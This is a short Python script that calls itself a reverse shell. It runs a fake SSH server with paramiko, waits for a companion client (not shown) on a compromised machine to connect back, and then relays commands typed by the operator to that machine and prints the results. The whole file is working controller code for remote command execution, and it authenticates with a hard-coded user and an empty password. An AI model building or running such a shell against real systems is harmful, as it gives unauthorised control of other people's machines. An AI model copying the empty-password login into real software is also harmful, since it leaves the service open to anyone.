#!/usr/bin/env python
#
# fake_sshserver.py - It simulates a ssh client, but sends
#   commands for the client. It's a reverse shell.
#
# Author            - José V S Carneiro
#
# ------------------------------------------------------------------
#
# Examples:
#   # fake_sshserver.py --ip 192.168.0.125 --port 22    # Warning: privileged port
#   $ sudo fake_sshserver.py --ip 192.168.0.125         # default: 22
#
# Change the ip address above by your own. Note that this script must be
#   modified to allow commands from client to a honeypot.
#
# ------------------------------------------------------------------
#
# History:
#
#       Version: 0.1 2023-04-03, José V S Carneiro, git@josevaltersilvacarneiro.net
#           - First Version
#
# Copyright: GPLv3

import argparse

import socket
import paramiko
import threading
import sys

# your credentials
_USERNAME = 'jose'
_PASSWORD = ''

class Server(paramiko.ServerInterface):

    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):

        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED

        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):

        if username == _USERNAME and password == _PASSWORD:
            return paramiko.AUTH_SUCCESSFUL

        return paramiko.AUTH_FAILED

if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description='Usage fake_sshserver.py --ip [ip] --port [port]'
    )

    parser.add_argument(
        '--ip',
        type=str,
        help='the ip address of the interface that will listen',
        required=True
    )

    parser.add_argument(
        '--port',
        type=int,
        help='the port that will listen',
        default=22
    )

    args = parser.parse_args()

    server   = args.ip
    ssh_port = args.port

    host_key = paramiko.RSAKey(filename='test_rsa.key')

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        sock.bind((server, ssh_port))
        sock.listen(100)

        print('[+] Listening for connection...')

        client, addr = sock.accept()

    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)

    print('[+] Got a connection')

    try:
        fake_session = paramiko.Transport(client)
        fake_session.add_server_key(host_key)

        server = Server()

        try:
            fake_session.start_server(server=server)
        except paramiko.SSHException as e:
            print("[-] SSH negotiation failed")

        chan = fake_session.accept(20)

        print('[+] Authenticated')

        # shows `ClientConnected` - first ssh_command in fake_sshclient.py
        print(chan.recv(1024).decode())

        # greets the client
        chan.send('Welcome to Fake SSH')

        while True:

            try:

                # until command isn't empty, run
                while ( not (command := input('Enter command: ').strip('\n')) ): pass

                # if the command is different from exit, send to the client
                # otherwise close the connection

                if command != 'exit':
                    chan.send(command)
                    print('\n' + chan.recv(1024).decode())
                else:
                    # closing the application layer connection
                    chan.send('exit')

                    print('Exiting...')

                    # closing the transport layer connection
                    fake_session.close()
                    
                    # throws an exit exception
                    raise Exception('exit')

            # <CTRL+C>
            except KeyboardInterrupt:
                fake_session.close()

    except Exception as e:

        print('[-] Caught exception: ' + str(e))

        try:
            fake_session.close()
        except:
            pass

        sys.exit(1)
